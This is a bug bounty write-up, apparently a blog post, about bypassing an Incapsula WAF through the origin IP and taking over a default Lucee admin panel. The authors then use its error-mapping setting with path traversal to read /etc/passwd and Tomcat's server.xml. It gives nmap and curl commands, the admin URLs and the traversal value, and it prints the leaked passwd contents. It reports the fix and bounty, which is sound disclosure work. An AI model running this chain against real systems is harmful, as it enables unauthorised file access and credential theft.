---
layout: post
title: "Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion"
categories: BugBounty
---
## Bug Bounty - Information Disclosure through error message + WAF Bypass led to Local File Inclusion

# Summary:
This is a writeup about a critical bug that me and [0xcela](https://hackerone.com/cela) found while poking around. This bug is undisclosed due to private program so I'm going to refer the company as **redacted.com**
&nbsp;

A vulnerable directory was found which led to an information disclosure through error message. After trying different types of attacks we were blocked by Incapsula WAF, so we managed to find the origin ip to further continue our research where we found different endpoints which led to the same information disclosure through error message.


# Exploitation:
While bruteforcing hidden directories and looking through waybackurls, we found a path **/cfapps/** which output the error as shown in the picture below.
&nbsp;
![full path disclosure]({{ site.baseurl }}/assets/images/image2.png){:.images}

&nbsp;

We also found some endpoints that accepted parameters but soon as we tried something suspicious we were blocked and we couldn't access that site anymore. So we decided to look through censys.io search engine without any specific filter only "redacted.com" and we found the origin ip.

To prove that we found the origin ip, we could compare the body and site headers.
&nbsp;
{% highlight bash %}
> $ nmap -p80,443 redacted.com
80/tcp open http Incapsula CDN httpd
443/tcp open ssl/http Incapsula CDN http

> $ nmap -p80,443 -sV IP
PORT STATE SERVICE VERSION
80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
443/tcp open ssl/http Apache Tomcat/Coyote JSP engine 1.1

> $ curl https://IP/cfapps/ -k -v
<!doctype html>
<title>External Apps</title>
..[SNIP]..
<div class="center padding">
{ts '2019-05-28 13:06:26'}
</div>
..[SNIP]..
</html>

> $ curl https://redacted.com/cfapps/ -v
<!doctype html>
<title>External Apps</title>
..[SNIP]..
<div class="center padding">
{ts '2019-05-28 13:07:53'}
</div>
..[SNIP]..
</html>
{% endhighlight %}
&nbsp;

We decided to report this because we thought that it would count as valid bug as it was exposing full paths but..
&nbsp;
![h1 reply]({{ site.baseurl }}/assets/images/image3.png){:.images}
&nbsp;
We continued our research to come up with an attack vector. We managed to log in into Lucee framework then abused Error Mapping function. What this function does is that when an error occurs, it redirects to a default error which is stored in a local file, in our case we could change it to read sensitive files.
&nbsp;
After knowing that it uses Lucee framework, we browsed to https://IP/lucee/
&nbsp;

Lucee has a public admin interface by default which you can find the path on view-source of /lucee/ and is located on https://IP/lucee/lucee/admin/server.cfm
&nbsp;

This prompts for a new password, which we set to admin321. We could log out and log in again on **https://IP/lucee/lucee/admin/web.cfm**. Even after we set a new password we could still change it by browsing to /server.cfm
&nbsp;
Browsing to /lucee/lucee/admin/web.cfm?action=server.error we could change the function when the application receives an 404 or 500 error, we changed the 500 error from default value (/lucee/templates/error/error.cfm) to **../../../../../../../../../../etc/passwd.**
&nbsp;
![Lucee Interface]({{ site.baseurl }}/assets/images/image4.png){:.images}
&nbsp;

**To execute the error.cfm, we made a request on a page that returned error 500**
```bash
curl -X GET \
https://IP/lucee/lucee/admin/web.cfm?action=debugging.logs&action2=detail&id=DCF806E56E1192D43C0A8B64EC573BC6
```
&nbsp;
**Response**:
HTTP/1.1 500 Internal Server Error
Content-Type: text/html;charset=UTF-8

> root:x:0:0:root:/root:/bin/bash
> bin:x:1:1:bin:/bin:/sbin/nologin
> daemon:x:2:2:daemon:/sbin:/sbin/nologin
> adm:x:3:4:adm:/var/adm:/sbin/nologin
> lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
> sync:x:5:0:sync:/sbin:/bin/sync
> shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
> halt:x:7:0:halt:/sbin:/sbin/halt
> mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
> operator:x:11:0:operator:/root:/sbin/nologin
> games:x:12:100:games:/usr/games:/sbin/nologin
> ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
> nobody:x:99:99:Nobody:/:/sbin/nologin
> systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
> dbus:x:81:81:System message bus:/:/sbin/nologin
> polkitd:x:999:997:User for polkitd:/:/sbin/nologin
> chrony:x:998:996::/var/lib/chrony:/sbin/nologin
> sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
> **raladmin:x:1000:1000::/home/raladmin:/bin/bash**
> sssd:x:997:994:User for sssd:/:/sbin/nologin
> nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
> tcpdump:x:72:72::/:/sbin/nologin
> tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
> setroubleshoot:x:996:992::/var/lib/setroubleshoot:/sbin/nologin
> **webuser:x:1001:1001:webuser:/home/webuser:/bin/bash**
> postfix:x:89:89::/var/spool/postfix:/sbin/nologin
>{: style="color: red"}

&nbsp;
![passwd]({{ site.baseurl }}/assets/images/image5.png){:.images}
&nbsp;
We also managed to read ../../../../../../../../../../../../usr/share/tomcat/conf/server.xml
&nbsp;
There was some sensitive info located in this file, including web-ldap and azure cloud postgresql passwords

# Note:
- Security Team decided to rate this bug as critical
- Bounty awarded
- Vulnerability fixed